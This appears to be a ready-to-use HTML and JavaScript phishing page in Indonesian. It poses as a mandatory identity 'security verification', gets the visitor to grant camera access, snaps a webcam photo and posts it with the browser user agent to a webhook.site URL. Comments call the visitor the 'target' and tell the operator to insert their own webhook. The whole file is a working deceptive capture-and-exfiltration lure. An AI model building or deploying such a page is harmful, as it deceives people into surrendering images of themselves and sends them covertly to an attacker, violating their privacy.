# cybersecurity<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 Verifikasi Keamanan</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
        body {
            background: #0b0f1c;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }
        .card {
            background: #1a1f2f;
            padding: 30px 25px;
            border-radius: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.7);
            max-width: 480px;
            width: 100%;
            text-align: center;
            border: 1px solid #2e3a55;
        }
        h2 {
            color: #00e6b0;
            font-size: 28px;
            margin-top: 0;
            letter-spacing: 1px;
        }
        p {
            color: #b0c4de;
            font-size: 16px;
            margin: 10px 0 20px;
        }
        #btn {
            background: #00e6b0;
            border: none;
            padding: 18px 30px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 60px;
            color: #0b0f1c;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 6px 0 #008f6b;
            width: 100%;
        }
        #btn:active {
            transform: translateY(6px);
            box-shadow: none;
        }
        #btn:disabled {
            opacity: 0.5;
            transform: translateY(6px);
            box-shadow: none;
            pointer-events: none;
        }
        video {
            width: 100%;
            border-radius: 24px;
            margin: 20px 0 10px;
            background: #000;
            display: none;
            border: 2px solid #00e6b0;
        }
        #result {
            margin-top: 16px;
            background: #0f1422;
            padding: 12px;
            border-radius: 20px;
            color: #b0c4de;
            font-size: 14px;
            word-break: break-all;
            display: none;
            border: 1px solid #2e3a55;
        }
        #log {
            margin-top: 16px;
            background: #0f1422;
            padding: 10px;
            border-radius: 20px;
            color: #7a8aa8;
            font-size: 13px;
            text-align: left;
            max-height: 120px;
            overflow-y: auto;
        }
        .badge {
            color: #00e6b0;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="card">
    <h2>🔐 Verifikasi Wajib</h2>
    <p>Klik tombol di bawah untuk <span class="badge">verifikasi identitas</span> kamu.</p>
    <button id="btn">✅ Verifikasi Sekarang</button>
    <video id="video" autoplay playsinline></video>
    <div id="result"></div>
    <div id="log">📡 Log akan muncul di sini...</div>
</div>

<script>
    (function() {
        const btn = document.getElementById('btn');
        const video = document.getElementById('video');
        const resultDiv = document.getElementById('result');
        const logDiv = document.getElementById('log');

        function log(msg) {
            logDiv.innerHTML += `<br>🔹 ${msg}`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        btn.addEventListener('click', function() {
            btn.disabled = true;
            btn.innerText = '⏳ Mengakses kamera...';
            log('📷 Meminta izin kamera...');

            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                alert('❌ Browser tidak mendukung akses kamera!');
                btn.disabled = false;
                btn.innerText = '✅ Verifikasi Sekarang';
                log('❌ Gagal: browser tidak support getUserMedia');
                return;
            }

            navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
                .then(stream => {
                    log('✅ Kamera berhasil diakses!');
                    video.style.display = 'block';
                    video.srcObject = stream;
                    btn.innerText = '📸 Ambil Foto & Kirim';

                    // Ubah tombol jadi ambil foto
                    btn.onclick = function() {
                        btn.disabled = true;
                        btn.innerText = '⏳ Mengirim...';
                        log('📸 Mengambil screenshot...');

                        const canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, 640, 480);
                        const imageData = canvas.toDataURL('image/png');

                        // Tampilkan hasil di layar (biar target liat fotonya)
                        resultDiv.style.display = 'block';
                        resultDiv.innerHTML = `<img src="${imageData}" style="width:100%; border-radius:16px; border:2px solid #00e6b0;">`;

                        log('📤 Mengirim ke webhook...');

                        // === GANTI URL WEBHOOK DI BAWAH INI ===
                        const WEBHOOK_URL = 'https://webhook.site/4e7c7a7a-7a7a-7a7a-7a7a-7a7a7a7a7a7a'; // <-- GANTI PUNYA LU

                        fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                timestamp: new Date().toISOString(),
                                userAgent: navigator.userAgent,
                                gambar: imageData
                            })
                        })
                        .then(res => {
                            log('✅ Berhasil dikirim ke webhook!');
                            btn.innerText = '✅ Sukses!';
                            btn.disabled = false;
                            // Matikan stream kamera
                            stream.getTracks().forEach(track => track.stop());
                            video.style.display = 'none';
                            // Reset tombol
                            btn.onclick = null;
                            btn.disabled = false;
                            btn.innerText = '✅ Verifikasi Selesai';
                        })
                        .catch(err => {
                            log('❌ Gagal kirim: ' + err.message);
                            alert('❌ Gagal kirim ke server, cek koneksi!');
                            btn.disabled = false;
                            btn.innerText = '📸 Ambil Foto & Kirim';
                        });
                    };

                    btn.disabled = false;
                })
                .catch(err => {
                    log('❌ Izin ditolak atau tidak ada kamera: ' + err.message);
                    alert('❌ Kamu harus izinkan akses kamera! Atau kamu gak punya kamera?');
                    btn.disabled = false;
                    btn.innerText = '✅ Verifikasi Sekarang';
                    btn.onclick = null; // reset
                });
        });

    })();
</script>

</body>
</html>